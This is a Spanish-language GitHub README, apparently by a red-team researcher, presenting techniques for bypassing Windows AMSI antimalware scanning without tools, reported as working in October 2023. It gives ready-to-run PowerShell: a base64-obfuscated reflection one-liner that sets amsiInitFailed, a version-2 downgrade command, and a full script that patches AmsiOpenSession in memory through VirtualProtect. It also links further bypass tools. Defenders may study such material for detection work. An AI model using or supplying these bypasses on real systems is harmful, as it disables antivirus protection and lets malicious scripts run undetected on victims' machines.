# AMSI BYPASS WITHOUT TOOLS 2023

En esta investigación se han probado numerosos payloads y técnicas sin exito, lo que se detalla a continuación funciona a 08/10/2023.
Destacar que todas estas soluciones se pueden realizar desde un usuario sin privilegios y sin la necesidad de herramientas, en caso de contar con privilegios o herramientas se podrían utilizar alguna más como modificar alguna clave de registro etc.

Con el lanzamiento de Windows 10, Microsoft introdujo AMSI, una interfaz de programación de aplicaciones (API) que permite la detección de malware en una amplia variedad de lenguajes de programación, incluyendo PowerShell. AMSI actúa como un puente que conecta las aplicaciones con el software antivirus.

Si desean profundizar más en la teoría visitien https://learn.microsoft.com/es-es/windows/win32/amsi/how-amsi-helps.


![image](https://github.com/ivancabrera02/AMSI/assets/103500562/a84a620b-b4bf-40c3-adf0-87922d478b87)

## Que detecta AMSI?

* Control de cuentas de usuario o UAC (elevación de privilegios de archivos EXE, COM y MSI, o instalación de ActiveX)
* PowerShell (evaluación de los scripts, el uso interactivo y el código dinámico)
* Windows Script Host (wscript.exe y cscript.exe)
* JavaScript y VBScript
* Macros de VBA de Office

## Técnicas de evasión para Red Team

### Separar Strings

Por hacer una breve introducción pondré el típico ejemplo que no puede faltar como es el separar strings.

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/afc8d173-246c-4fab-9741-5288420747d7)

### Base64

Podemos realizar lo mismo en base64. Ignorar el error de sintaxis :)

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/3758ebe8-95dd-48fe-bf8f-b3c4ae1a9991)

### XOR

O utilizando XOR.

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/8a20cfca-0305-48cb-a8fe-c6e182c0909d)

Esto no está mal pero la idea es poder ejecutar scripts 'maliciosos' completos.

### Bajando versión

Una idea sería bajar la versión de powershell utilizando: powershell -version 2

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/68e79214-c511-4be0-ac7d-5cd657c546cc)

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/020611a3-a014-4c93-b839-3d2c3cbb0726)

En la primera imagen se usa la versión 3 de powershell y como se puede apreciar se bloquea el script, en cambio en la segunda imagen usando una versión inferior se ejecuta sin problemas.

### Payload base64

Otra de las que mejor funciona es usando el siguiente payload en base64:

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/0be5c1d8-18e5-4603-ae85-edcb30f95d79)

### Error

Forzando errores a amsi

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/97575917-2f3f-451a-929c-780709a38585)

### Script

function lookFuncAddr{
Param($moduleName, $functionName)
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}
[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)

![image](https://github.com/ivancabrera02/AMSI/assets/103500562/ecab53cd-035c-47ef-b863-84b6f2bf147d)


## Herramientas y recursos extra

* https://amsi.fail/
* https://github.com/tokyoneon/Chimera
* https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
